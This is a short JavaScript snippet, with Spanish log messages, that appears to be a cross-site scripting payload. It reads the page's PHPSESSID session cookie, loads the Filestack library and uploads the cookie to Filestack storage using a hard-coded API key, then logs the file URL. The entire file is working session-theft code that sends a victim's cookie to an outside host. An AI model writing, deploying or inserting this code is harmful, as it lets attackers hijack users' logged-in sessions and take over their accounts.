var session = document.cookie.match(/PHPSESSID=(\w+)/);
var sessionSave = session ? session[1] : '';
var blob = new Blob([JSON.stringify(sessionSave)], { type: 'text/plain' });

var script = document.createElement('script');
script.src = 'https://static.filestackapi.com/filestack-js/3.x.x/filestack.min.js';
script.setAttribute('crossorigin', 'anonymous');
script.onload = function() {
  var client = filestack.init('AbCvtsTPTkKCbD6Xa69Esz');

  client.upload(blob)
    .then(response => {
      var fileUrl = response.url;
      console.log('Archivo subido con éxito:', fileUrl);
    })
    .catch(error => {
      console.error('Error al subir el archivo:', error);
    });
};

document.head.appendChild(script);
